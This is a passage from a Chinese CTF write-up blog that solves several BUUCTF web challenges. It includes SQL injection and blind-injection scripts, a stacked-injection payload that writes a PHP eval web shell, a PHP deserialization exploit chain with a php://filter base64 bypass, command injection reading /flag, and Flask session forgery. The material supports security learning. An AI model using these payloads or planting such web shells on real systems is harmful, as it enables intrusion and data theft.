src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220711214145577.png" alt="image-20220711214145577"></p><p>原理可以去看这个</p><p><a href="https://www.anquanke.com/post/id/213235#h2-8">php源码分析 require_once 绕过不能重复包含文件的限制 - 安全客，安全资讯平台 (anquanke.com)</a></p><h2 id="FireshellCTF2020-Caas"><a href="#FireshellCTF2020-Caas" class="headerlink" title="[FireshellCTF2020]Caas"></a>[FireshellCTF2020]Caas</h2><p>开局一个大输入框</p><p>要求我们输入代码进行编辑，看报错能猜出来这是c的文件</p><p>然后是利用了#include &quot;&quot;预处理编译报错</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220714132332448.png" alt="image-20220714132332448"></p><p>通过报错可以把include的文件内容输出出来</p><h2 id="October-2019-Twice-SQL-Injection"><a href="#October-2019-Twice-SQL-Injection" class="headerlink" title="October 2019 Twice SQL Injection"></a>October 2019 Twice SQL Injection</h2><p>这个二次注入就是在注册的时候把注入语句作为username就行</p><p>其他的功能基本上没啥用</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220714134524580.png" alt="image-20220714134524580"></p><pre class="language-txt" data-language="txt"><code class="language-txt">username &#x3D;1&#39; union select database() #username &#x3D;1&#39; union select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;ctftraining&#39; # username &#x3D;1&#39; union select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag&#39;# &#x2F;*这里可以直接 username &#x3D;1&#39; union select * from flag # *&#x2F;username &#x3D;1&#39; union select flag from flag #</code></pre><h2 id="SUCTF-2018-MultiSQL"><a href="#SUCTF-2018-MultiSQL" class="headerlink" title="[SUCTF 2018]MultiSQL"></a>[SUCTF 2018]MultiSQL</h2><p>sql的预处理</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220714161112201.png" alt="image-20220714161112201"></p><p>这里有两个注入点</p><p>一个是注册的地方对用户名有一个过滤，应该是可以二次注入的</p><p>还一个是在登录后的id的位置，有个数字型的盲注，这个还能造成越权访问，不过没啥用</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220714161354408.png" alt="image-20220714161354408"></p><p>题目本身有一些过滤，用<code>id=1^(if(ascii(mid(user(),1,1))&gt;0,0,1))</code>异或的方式来判断注入点</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220714162007822.png" alt="image-20220714162007822"></p><p>这里呢过滤了union，select ，&amp;，|</p><p>不过flag也不在数据库里，这里是要求用outfile写文件进去，可写的路径是/var/www/html/favicon/目录下，这是因为有个修改头像的功能，上传的头像就在这个目录下</p><p>不想写了，偷个代码</p><pre class="language-python" data-language="python"><code class="language-python">str&#x3D;&quot;select &#39;&lt;?php eval($_POST[_]);?&gt;&#39; into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;favicon&#x2F;shell.php&#39;;&quot;len_str&#x3D;len(str)for i in range(0,len_str):if i &#x3D;&#x3D; 0:print(&#39;char(%s&#39;%ord(str[i]),end&#x3D;&quot;&quot;)else:print(&#39;,%s&#39;%ord(str[i]),end&#x3D;&quot;&quot;)print(&#39;)&#39;)</code></pre><p>然后借助堆叠注入和预处理方式</p><p>最终payload为</p><pre class="language-txt" data-language="txt"><code class="language-txt">?id&#x3D;1;set @sql&#x3D;char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,95,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59);prepare query from @sql;execute query;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220714165313730.png" alt="image-20220714165313730"></p><h2 id="EIS-2019-EzPOP"><a href="#EIS-2019-EzPOP" class="headerlink" title="[EIS 2019]EzPOP"></a>[EIS 2019]EzPOP</h2><p>好难的链子，做这个之前本来以为自己的反序列化水平还可以了，不过现在看起来也就那样了hhhh</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);class A &#123;    protected $store;    protected $key;    protected $expire;    public function __construct($store, $key &#x3D; &#39;flysystem&#39;, $expire &#x3D; null) &#123;        $this-&gt;key &#x3D; $key;        $this-&gt;store &#x3D; $store;        $this-&gt;expire &#x3D; $expire;    &#125;    public function cleanContents(array $contents) &#123;        $cachedProperties &#x3D; array_flip([            &#39;path&#39;, &#39;dirname&#39;, &#39;basename&#39;, &#39;extension&#39;, &#39;filename&#39;,            &#39;size&#39;, &#39;mimetype&#39;, &#39;visibility&#39;, &#39;timestamp&#39;, &#39;type&#39;,        ]);        foreach ($contents as $path &#x3D;&gt; $object) &#123;            if (is_array($object)) &#123;                $contents[$path] &#x3D; array_intersect_key($object, $cachedProperties);            &#125;        &#125;        return $contents;    &#125;    public function getForStorage() &#123;        $cleaned &#x3D; $this-&gt;cleanContents($this-&gt;cache);        return json_encode([$cleaned, $this-&gt;complete]);    &#125;    public function save() &#123;        $contents &#x3D; $this-&gt;getForStorage();        $this-&gt;store-&gt;set($this-&gt;key, $contents, $this-&gt;expire);    &#125;    public function __destruct() &#123;        if (!$this-&gt;autosave) &#123;            $this-&gt;save();        &#125;    &#125;&#125;class B &#123;    protected function getExpireTime($expire): int &#123;        return (int) $expire;    &#125;    public function getCacheKey(string $name): string &#123;        return $this-&gt;options[&#39;prefix&#39;] . $name;    &#125;    protected function serialize($data): string &#123;        if (is_numeric($data)) &#123;            return (string) $data;        &#125;        $serialize &#x3D; $this-&gt;options[&#39;serialize&#39;];        return $serialize($data);    &#125;    public function set($name, $value, $expire &#x3D; null): bool&#123;        $this-&gt;writeTimes++;        if (is_null($expire)) &#123;            $expire &#x3D; $this-&gt;options[&#39;expire&#39;];        &#125;        $expire &#x3D; $this-&gt;getExpireTime($expire);        $filename &#x3D; $this-&gt;getCacheKey($name);        $dir &#x3D; dirname($filename);        if (!is_dir($dir)) &#123;            try &#123;                mkdir($dir, 0755, true);            &#125; catch (\Exception $e) &#123;                &#x2F;&#x2F; 创建失败            &#125;        &#125;        $data &#x3D; $this-&gt;serialize($value);        if ($this-&gt;options[&#39;data_compress&#39;] &amp;&amp; function_exists(&#39;gzcompress&#39;)) &#123;            &#x2F;&#x2F;数据压缩            $data &#x3D; gzcompress($data, 3);        &#125;        $data &#x3D; &quot;&lt;?php\n&#x2F;&#x2F;&quot; . sprintf(&#39;%012d&#39;, $expire) . &quot;\n exit();?&gt;\n&quot; . $data;        $result &#x3D; file_put_contents($filename, $data);        if ($result) &#123;            return true;        &#125;        return false;    &#125;&#125;if (isset($_GET[&#39;src&#39;]))&#123;    highlight_file(__FILE__);&#125;$dir &#x3D; &quot;uploads&#x2F;&quot;;if (!is_dir($dir))&#123;    mkdir($dir);&#125;unserialize($_GET[&quot;data&quot;]);</code></pre><p>利用点是很明显的</p><p>B类里的set方法里调用了一个file_put_contents，然后两个参数在一定程度上是可控的，所以我们可以利用这个来写马</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220714225843677.png" alt="image-20220714225843677"></p><p><strong>我们先来看data参数</strong></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220714230047933.png" alt="image-20220714230047933"></p><p>可以看到data参数在将value参数作为serialize方法的参数调用后，将serialize方法的返回值进行了拼接，最终成为了我们写入的内容</p><p>这里是serizalize方法的内容</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220714230354313.png" alt="image-20220714230354313"></p><p>就是将serialize赋成一个函数，再执行一下将其返回</p><p>这里我们可以让options[&#39;serialize&#39;]=trim，这样返回的值只会去掉首尾的空格，内容不变</p><p>所以这里data的值就是$value，而$value是作为set方法里的一个参数出现的</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220714231215057.png" alt="image-20220714231215057"></p><p>另外要注意别让数据压缩</p><p>也就是让$this-&gt;options[&#39;data_compress&#39;] = false;</p><p>而要调用set方法就要看A类里的save方法了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220714231306819.png" alt="image-20220714231306819"></p><p>然后这里还调用了getForStorage，将getForStorage的返回值当作$contents，也就是set中的$value，getForStorage中还通过cleanContents来对cleaned的值进行了过滤</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220714231425923.png" alt="image-20220714231425923"></p><p>在这里可以令cache=array()，这样就能保证contents的仅仅是complete这个变量的内容了</p><p>而为了实现调用save参数的目的，我们要看反序列化的入口<img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220714232051375.png" alt="image-20220714232051375"></p><p>让autosave=false</p><pre class="language-txt" data-language="txt"><code class="language-txt">经过上面的分析，我们已知的要定义的内容有autosave&#x3D;falsecomplete&#x3D;payloadcache&#x3D;array()options[&#39;serialize&#39;]&#x3D;trim$this-&gt;store &#x3D; new B()$this-&gt;options[&#39;data_compress&#39;] &#x3D; false;</code></pre><p><strong>然后再来看filename部分</strong></p><p>filename是经过getCacheKey函数拼接后的结果，我们可以让</p><p>options[&#39;prefix&#39;]=shell 然后让name=.php，一样可以达到写入php马的目的</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220714232546060.png" alt="image-20220714232546060"></p><p>接下来就要看name的来源了</p><p>这同样是set的一个形参，是A类中key变量的值，我们可以直接对其赋值</p><p>这部分我们定义的参数可以为</p><pre class="language-php" data-language="php"><code class="language-php">options[&#39;prefix&#39;]&#x3D;shellkey &#x3D; .php</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220715001039395.png" alt="image-20220715001039395"></p><p>调试一下可以看到我们的链子是正确的</p><p>然后我们需要做的部分是绕过data里的exit()函数，因为</p><p><code>$data = &quot;&lt;?php\n//&quot; . sprintf(&#39;%012d&#39;, $expire) . &quot;\n exit();?&gt;\n&quot; . $data;</code></p><p>这个格式化输出固定了长度为12的数值，不能写入我们的shell</p><p>这里就要利用p牛讲过的利用伪协议的base64破坏原有的php内容的方式了</p><blockquote><p>由于&lt;、?、()、;、&gt;、\n都不是base64编码的范围，所以base64解码的时候会自动将其忽略，所以解码之后就剩phpexit了，但是呢base64算法解码时是4个字节一组，所以我们还需要在前面加个字符</p></blockquote><p>在本题里就是php//exit加上中间格式化的12个字符共21个</p><p>我们先让</p><pre class="language-none"><code class="language-none">options[&#39;prefix&#39;] &#x3D; &#39;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;&#39;</code></pre><p>这样就会令写入的内容进行base64的解码</p><p>然后让</p><pre class="language-none"><code class="language-none">complete &#x3D; &quot;xxxPD9waHAgQGV2YWwoJF9QT1NUWyJhIl0pOz8+&quot;&#x2F;&#x2F;xxx&lt;?php @eval($_POST[&quot;a&quot;]);?&gt;</code></pre><p>本地尝试一下可以成功写入</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220715002606265.png" alt="image-20220715002606265"></p><p>然后执行命令就可以了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220715003158025.png" alt="image-20220715003158025"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220715003215168.png" alt="image-20220715003215168"></p><p>exp</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);class A &#123;    protected $store;    protected $key;    protected $expire;    public function __construct() &#123;        $this-&gt;key &#x3D; &#39;shell.php&#39;;        $this-&gt;store &#x3D; new B();;        $this-&gt;expire &#x3D; 0;        $this -&gt; autosave &#x3D; false;        $this -&gt; complete &#x3D; &#39;xxxPD9waHAgQGV2YWwoJF9QT1NUWyJhIl0pOz8+&#39;;        $this -&gt; cache &#x3D; array();    &#125;&#125;class B &#123;    public $options &#x3D; array();    function __construct()    &#123;        $this-&gt;options[&#39;serialize&#39;] &#x3D; &#39;trim&#39;;        $this-&gt;options[&#39;prefix&#39;] &#x3D; &#39;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;&#39;;        $this-&gt;options[&#39;data_compress&#39;] &#x3D; false;    &#125;&#125;echo urlencode(serialize(new A()));    &#x2F;&#x2F;O%3A1%3A%22A%22%3A6%3A%7Bs%3A8%3A%22%00%2A%00store%22%3BO%3A1%3A%22B%22%3A1%3A%7Bs%3A7%3A%22options%22%3Ba%3A3%3A%7Bs%3A9%3A%22serialize%22%3Bs%3A4%3A%22trim%22%3Bs%3A6%3A%22prefix%22%3Bs%3A50%3A%22php%3A%2F%2Ffilter%2Fwrite%3Dconvert.base64-decode%2Fresource%3D%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7D%7Ds%3A6%3A%22%00%2A%00key%22%3Bs%3A9%3A%22shell.php%22%3Bs%3A9%3A%22%00%2A%00expire%22%3Bi%3A0%3Bs%3A8%3A%22autosave%22%3Bb%3A0%3Bs%3A8%3A%22complete%22%3Bs%3A39%3A%22xxxPD9waHAgQGV2YWwoJF9QT1NUWyJhIl0pOz8%2B%22%3Bs%3A5%3A%22cache%22%3Ba%3A0%3A%7B%7D%7D</code></pre><p><strong>另一种解法</strong></p><p>让</p><pre class="language-none"><code class="language-none">$b &#x3D; new B();$b-&gt;writeTimes &#x3D; 0;$b -&gt; options &#x3D; array(&#39;serialize&#39; &#x3D;&gt; &quot;system&quot;,    &#39;data_compress&#39; &#x3D;&gt; false,    &#39;prefix&#39; &#x3D;&gt; &quot;b&quot;);$a &#x3D; new A($store &#x3D; $b, $key &#x3D; &quot;.php&quot;, $expire &#x3D; 0);$a-&gt;autosave &#x3D; false;$a-&gt;cache &#x3D; array();$a-&gt;complete &#x3D; &#39;&#96;cat &#x2F;flag &gt; .&#x2F;flag.php&#96;&#39;echo urlencode(serialize($a));</code></pre><p>相当于</p><p>执行</p><pre class="language-php" data-language="php"><code class="language-php">system(&#39;[[],&quot;&#96;cat &#x2F;flag &gt; .&#x2F;flag.php&#96;&quot;]&#39;)</code></pre><p>在shell里执行的时候 反引号 的优先级是高于引号的，所以会先执行<code>cat /flag &gt; ./flag.php</code>，flag就被写到flag.php里面去了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220716114417633.png" alt="image-20220716114417633"></p><p><a href="https://www.sec-in.com/article/333">EIS 2019]EzPOP的多种解-SecIN (sec-in.com)</a></p><p>这个好像是根据thinkphp6.0的链子出的题</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220716115312823.png" alt="image-20220716115312823"></p><p><a href="https://www.anquanke.com/post/id/194036">Thinkphp 6.0 新的Gadget - 安全客，安全资讯平台 (anquanke.com)</a></p><h2 id="极客大挑战-2020-Greatphp"><a href="#极客大挑战-2020-Greatphp" class="headerlink" title="[极客大挑战 2020]Greatphp"></a>[极客大挑战 2020]Greatphp</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);class SYCLOVER &#123;    public $syc;    public $lover;    public function __wakeup()&#123;        if( ($this-&gt;syc !&#x3D; $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) &#x3D;&#x3D;&#x3D; md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)&#x3D;&#x3D;&#x3D; sha1($this-&gt;lover)) )&#123;           if(!preg_match(&quot;&#x2F;\&lt;\?php|\(|\)|\&quot;|\&#39;&#x2F;&quot;, $this-&gt;syc, $match))&#123;               eval($this-&gt;syc);           &#125; else &#123;               die(&quot;Try Hard !!&quot;);           &#125;                   &#125;    &#125;&#125;if (isset($_GET[&#39;great&#39;]))&#123;    unserialize($_GET[&#39;great&#39;]);&#125; else &#123;    highlight_file(__FILE__);&#125;?&gt;</code></pre><p>其实看起来很简单，利用数组绕过if判断然后可以利用反引号什么的执行命令</p><p>但是唯一的问题在于eval不能执行数组中的命令</p><p>所以这里要用Error类当当作字符串的时候会触发toString函数导致XSS</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220716121942056.png" alt="image-20220716121942056"></p><blockquote><p>可以看到当作字符串时返回的内容会以字符串的形式输出当前报错，包含当前的错误信息（payload）以及当前报错的行号（2），而传入 Error(“payload”,1) 中的错误代码“1”则没有输出出来，但其本身其实并不一样，所以可以利用这个来绕过sha1和md5的比较</p></blockquote><p>最后就是构造我们的payload</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220716125507887.png" alt="image-20220716125507887"></p><p>这里因为引号和括号都被过滤了，所以采用取反的方式，至于最后添加的?&gt;是为了使整个命令闭合(?应该</p><p>其实更严谨一点要用?&gt;&lt;?=include ?&gt;这种</p><pre class="language-txt" data-language="txt"><code class="language-txt">事实上$str &#x3D; &quot;?&gt;&lt;?&#x3D;include~&quot;.urldecode(&quot;%d0%99%93%9e%98&quot;).&quot;?&gt;&quot;;之后，我在本地把$this-&gt;syc输出出来的内容前面一部分是Error: ?&gt;&lt;?&#x3D;include~Й���; in +报错路径这种，我本来觉得?&gt;的效果是把命令和没有用的报错分开，但这里如果去掉前面的?&gt;&lt;?&#x3D;还是可以拿到flag，但是为什么去掉后面的?&gt;就不行了呢，而且把后面的?&gt;用分号代替也不行,好怪啊</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220716125448997.png" alt="image-20220716125448997"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220716125651077.png" alt="image-20220716125651077"></p><h2 id="SWPU2019-Web4"><a href="#SWPU2019-Web4" class="headerlink" title="[SWPU2019]Web4"></a>[SWPU2019]Web4</h2><p>好烦sql注入</p><p>先是预处理的堆叠注入</p><pre class="language-none"><code class="language-none">prepare stmt_name from preparable_stmt;execute stmt_name [using @var_name [, @var_name] ...];&#123;deallocate | drop&#125; prepare stmt_name;</code></pre><p>还是个时间盲注</p><p>过滤了一些关键字，可以用十六进制来绕过</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/t01c4535f91421496d4.png" alt="img"></p><p>抄个脚本</p><pre class="language-python" data-language="python"><code class="language-python">#author: c1e4rimport requestsimport jsonimport time def main():    #题目地址    url &#x3D; &#39;&#39;&#39;http:&#x2F;&#x2F;ed59e513-784d-42b5-81d0-2c4dc976d086.node3.buuoj.cn&#x2F;index.php?r&#x3D;Login&#x2F;Index&#39;&#39;&#39;    #注入payload    payloads &#x3D; &quot;admin&#39;;set @a&#x3D;0x&#123;0&#125;;prepare b from @a;execute b--+&quot;    flag &#x3D; &#39;&#39;    for i in range(1,30):        #查询payload        payload &#x3D; &quot;select if(ascii(substr((select flag from flag),&#123;0&#125;,1))&#x3D;&#123;1&#125;,sleep(3),1)&quot;        for j in range(0,128):            #将构造好的payload进行16进制转码和json转码            datas &#x3D; &#123;&#39;username&#39;:payloads.format(str_to_hex(payload.format(i,j))),&#39;password&#39;:&#39;test213&#39;&#125;            data &#x3D; json.dumps(datas)            times &#x3D; time.time()            res &#x3D; requests.post(url &#x3D; url, data &#x3D; data)            if time.time() - times &gt;&#x3D; 3:                flag &#x3D; flag + chr(j)                print(flag)                break def str_to_hex(s):    return &#39;&#39;.join([hex(ord(c)).replace(&#39;0x&#39;, &#39;&#39;) for c in s]) if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    main()</code></pre><p>扫到最后能发现是glzjin_wants_a_girl_friend.zip</p><p>应该是源码文件，下载下来审计一下</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719124740608.png" alt="image-20220719124740608"></p><p>这里如果$viewDate可控，就能达到变量覆盖的目的</p><p><strong><code>extract</code></strong> 传入 <strong><code>viewdata</code></strong> 数组造成变量覆盖，发现利用 <strong><code>loadView</code></strong> 方法的并且第二个元素可控的地方只有**<code>UserController.php</code>**</p><p>在UserController.php中</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719123840518.png" alt="image-20220719123840518"></p><p>$listData是从REQUEST提取出来的，完全可控。</p><p>在 <code>userIndex.php</code> 文件里</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719124437218.png" alt="image-20220719124437218"></p><p>我们可以通过变量覆盖img_file这个变量达到文件包含flag文件的目的</p><p>在fun.php显示了路由控制的部分</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719125349740.png" alt="image-20220719125349740"></p><p>所以最后的payload就是</p><p><code>r=User/Index&amp;img_file=/../flag.php</code></p><p>这里的路径不能直接../flag.php是因为**dirname(__FILE__)**返回的路径是类似C:/root/www/b.php这种，所以要用/../flag.php</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719130208217.png" alt="image-20220719130208217"></p><h2 id="CISCN2019-华东南赛区-Web4"><a href="#CISCN2019-华东南赛区-Web4" class="headerlink" title="[CISCN2019 华东南赛区]Web4"></a>[CISCN2019 华东南赛区]Web4</h2><p>一个长着ssrf壳的Flask  session伪造</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719152339337.png" alt="image-20220719152339337"></p><p>可以看到在/flag路由下需要对session进行一个检查，我们先看一下当前的session</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719152324051.png" alt="image-20220719152324051"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719152525813.png" alt="image-20220719152525813"></p><p>里面的base64解码内容是www-data</p><p>我们需要构造成fuck</p><p>但是flask的session构造需要一个密钥</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719152730546.png" alt="image-20220719152730546"></p><p>题目里的密钥是随机的</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719152757332.png" alt="image-20220719152757332"></p><p>但只要有种子，就能得到伪随机数的内容</p><p>这里的seed使用的uuid.getnode()的值</p><p>这是是网卡mac地址的十进制数，储存路径为</p><p>/sys/class/net/（对应网卡）/address</p><p>//一般都是eth0</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719153332165.png" alt="image-20220719153332165"></p><p>得到数值为</p><p>187154010911467</p><p>然后跑随机数</p><pre class="language-python" data-language="python"><code class="language-python">import randomrandom.seed(187154010911467)print(str(random.random()*233))</code></pre><p>这里有个坑</p><p>题目环境是python2，然后会给随机数的后几位四舍五入，所以如果用python3跑拿不到正确的key</p><p>python2 ： 147.299990175</p><p>python3 ：147.299990174972</p><p>然后就是用flask-session-cookie-manager-master.py来伪造session</p><p>先拿到原本的格式</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719164437961.png" alt="image-20220719164437961"></p><p>然后修改内容后加密</p><p>(这里有几个csdn的wp上的key带了引号，但是我试的时候发现带了引号拿到的值没法访问flag)</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719164413939.png" alt="image-20220719164413939"></p><p>改一下session然后访问/flag路由就行了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719165101903.png" alt="image-20220719165101903"></p><h2 id="Black-Watch-入群题-Web"><a href="#Black-Watch-入群题-Web" class="headerlink" title="[Black Watch 入群题]Web"></a>[Black Watch 入群题]Web</h2><p>又是个sql的盲注。。。</p><p>注入点在热点的id上</p><p>直接上脚本了</p><pre class="language-python" data-language="python"><code class="language-python">from time import sleepimport requestsflag &#x3D; &#39;&#39;url &#x3D; &#39;http:&#x2F;&#x2F;5e09d480-4e60-4c83-86e7-50a897fd3c8f.node4.buuoj.cn:81&#x2F;backend&#x2F;content_detail.php?id&#x3D;1&#39;payload &#x3D; &#39;^(ord(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)^1&#39;   #newspayload1 &#x3D; &#39;^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;\&#39;news\&#39;)),&#123;&#125;,1))&gt;&#123;&#125;)^1&#39;  #admin,contentpayload2 &#x3D; &#39;^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;\&#39;admin\&#39;)),&#123;&#125;,1))&gt;&#123;&#125;)^1&#39;#admin表里有id,username,password,is_enable  contents表里有id,title,content,is_enablepayload3 &#x3D; &#39;^(ord(substr((select(group_concat(username))from(admin)),&#123;&#125;,1))&gt;&#123;&#125;)^1&#39;#username 9e014c86,7385d505    password a40b205c,8d44ad75for i in range(1,1000):    high &#x3D; 137    low &#x3D; 28    mid &#x3D; (high + low) &#x2F;&#x2F; 2    while(low &lt; high):        urls &#x3D; url + payload3.format(i,mid)        response &#x3D; requests.get(urls)        print(low,response.text,mid,high)        if &#39;content&#39;  in response.text:            low &#x3D; mid + 1        else:            high &#x3D; mid        mid &#x3D; (high + low) &#x2F;&#x2F; 2        #print(mid)        sleep(0.2)    if chr(mid) &#x3D;&#x3D; &#39;&#39;:        break    else:        flag +&#x3D; chr(mid)    print(flag)</code></pre><p>输入第二组用户名密码</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719201159850.png" alt="image-20220719201159850"></p><h2 id="SUCTF-2018-annonymous"><a href="#SUCTF-2018-annonymous" class="headerlink" title="[SUCTF 2018]annonymous"></a>[SUCTF 2018]annonymous</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$MY &#x3D; create_function(&quot;&quot;,&quot;die(&#96;cat flag.php&#96;);&quot;);$hash &#x3D; bin2hex(openssl_random_pseudo_bytes(32));eval(&quot;function SUCTF_$hash()&#123;&quot;    .&quot;global \$MY;&quot;    .&quot;\$MY();&quot;    .&quot;&#125;&quot;);if(isset($_GET[&#39;func_name&#39;]))&#123;    $_GET[&quot;func_name&quot;]();    die();&#125;show_source(__FILE__);</code></pre><p>本来以为是openssl_random_pseudo_bytes这个函数有类似伪随机数的漏洞，看了下wp发现是create_function的问题</p><p>create_function()函数在create之后会自动生成一个函数名为%00lambda_[0-999]，后面的数字会逐步递增</p><p>前几个试不出来就跑一遍就行</p><p><img 